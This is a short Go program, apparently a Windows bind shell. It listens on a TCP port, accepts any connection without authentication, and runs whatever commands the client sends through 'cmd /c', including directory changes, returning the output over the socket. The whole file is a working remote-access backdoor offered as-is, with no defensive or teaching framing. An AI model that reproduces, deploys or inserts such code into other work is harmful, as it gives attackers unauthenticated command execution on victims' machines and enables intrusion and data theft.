package main

import (
	"net"
	"os"
	"os/exec"
)

const (
	PROTOCOL = "tcp"
	IP_PORT  = "IP:PORT"
)

func Cmd(command string) string {
	output, err := exec.Command("cmd", "/c", command).Output()
	if err != nil {
		return "{-} Command error...\n"
	}
	return string(output)
}

func handleClient(conn net.Conn) {
	defer conn.Close()
	buffer := make([]byte, 1024)
	var i = 3
	for {
		conn.Write([]byte("{+} Enter command >>> "))

		readlen, err := conn.Read(buffer)
		var command = string(buffer[:readlen])
		if err != nil {
			break
		}
		if command[0:len(command)-2] == "Exit" {
			conn.Write(append([]byte("{+} BREAKPOINT\n")))
			os.Exit(1)
		}
		if string(command[0])+string(command[1]) == "cd" {
			os.Chdir(command[i : len(command)-2])
			conn.Write(append([]byte(command[i : len(command)-2])))
		} else {
			var ResultCmd = Cmd(command)
			conn.Write(append([]byte(ResultCmd)))
		}
	}
}

func main() {
	listener, _ := net.Listen(PROTOCOL, IP_PORT)
	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleClient(conn)
	}
}
